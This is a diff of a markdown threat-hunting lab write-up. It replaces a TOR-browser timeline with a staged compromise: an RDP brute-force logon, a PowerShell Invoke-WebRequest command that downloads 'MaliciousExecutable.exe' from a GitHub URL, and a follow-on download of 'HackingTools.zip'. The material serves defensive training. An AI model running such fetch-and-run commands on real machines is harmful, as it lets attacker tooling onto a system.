@@ -215,35 +215,34 @@ DeviceProcessEvents
 
 ## Chronological Event Timeline 
 
-### 1. RDP Brute Force Attack - Failed RDP Logons
+### 1. RDP Brute Force Attack - Successful Logon
 
-- **Timestamp:** `2025-03-05T01:03:21.8806891Z`
-- **Event:** The user "aaronmart" downloaded a file named `tor-browser-windows-x86_64-portable-14.0.1.exe` to the Downloads folder.
+- **Timestamp:** `2025-03-15T15:02:10.5325975Z`
+- **Event:** The threat actor successfully logged into the user account `aaronmart` on the endpoint `arm-thcompromis` after a RDP Brute Force attack.
+- **Action:** Successful logon.
+- 
+### 2. Invoke-WebRequest Execution - The Threat Actor Initiates a File Download
+
+- **Timestamp:** `2025-03-15T15:02:38.6575957Z`
+- **Event:** The user `aaronmart` executed an `Invoke-Webrequest` request to initiate the download of the `MaliciousExecutbale.exe` file.
 - **Action:** File download detected.
-- **File Path:** `C:\Users\aaronmart\Downloads\tor-browser-windows-x86_64-portable-14.0.1.exe`
+- **Process:** `powershell.exe`
+- **Command:** `Invoke-WebRequest -Uri \"https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/MaliciousExecutable.exe\" -OutFile \"$env:USERPROFILE\\Downloads\\MaliciousExecutable.exe\"`
+- **File Path:** `C:\Users\aaronmart\Downloads\MaliciousExecutable.exe`
 
-### 2. Process Execution - TOR Browser Installation
+### 3. MaliciousExecutbale.exe is Executed - The Malicious File is Utilized 
 
-- **Timestamp:** `2025-03-05T01:05:56.8154496Z`
-- **Event:** The user "aaronmart" executed the file `tor-browser-windows-x86_64-portable-14.0.1.exe` in silent mode, initiating a background installation of the TOR Browser.
-- **Action:** Process creation detected.
-- **Command:** `tor-browser-windows-x86_64-portable-14.0.1.exe /S`
-- **File Path:** `C:\Users\aaronmart\Downloads\tor-browser-windows-x86_64-portable-14.0.1.exe`
+- **Timestamp:** `2025-03-15T15:02:57.0097307Z`
+- **Event:** The user account "aaronmart" runs the recently downloaded, malicious `MaliciousExecutable.exe` file.
+- **Action:** Process creation of `MaliciousExecutable.exe` is detected.
 
-### 3. Process Execution - TOR Browser Launch
+### 4. HackingTools.zip Downloaded - MaliciousExecutable.exe Executes a File Download
 
-- **Timestamp:** `2025-03-05T01:07:10.6041161Z`
-- **Event:** User "aaronmart" opened the TOR browser. Subsequent processes associated with TOR browser, such as `firefox.exe` and `tor.exe`, were also created, indicating that the browser launched successfully.
-- **Action:** Process creation of TOR browser-related executables detected.
-- **File Path:** `C:\Users\aaronmart\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe`
-
-### 4. Network Connection - TOR Network
-
-- **Timestamp:** `2025-03-05T01:07:24.7605276Z`
-- **Event:** A network connection to IP `45.142.177.89` on port `443` by user "aaronmart" was established using `tor.exe`, confirming TOR browser network activity.
-- **Action:** Connection success.
-- **Process:** `tor.exe`
-- **File Path:** `C:\Users\aaronmart\desktop\tor browser\browser\torbrowser\tor\tor.exe`
+- **Timestamp:** `2025-03-15T15:02:57.0097307Z`
+- **Event:** The malicious file `MaliciousExecutable.exe`, initiates the download of the file 'HackingTools.zip`.
+- **Action:** File download detected.
+- **Process:** `powershell.exe`
+- **File Path:** `C:\Users\aaronmart\Downloads\HackingTools.zip`
 
 ### 5. Additional Network Connections - TOR Browser Activity
 
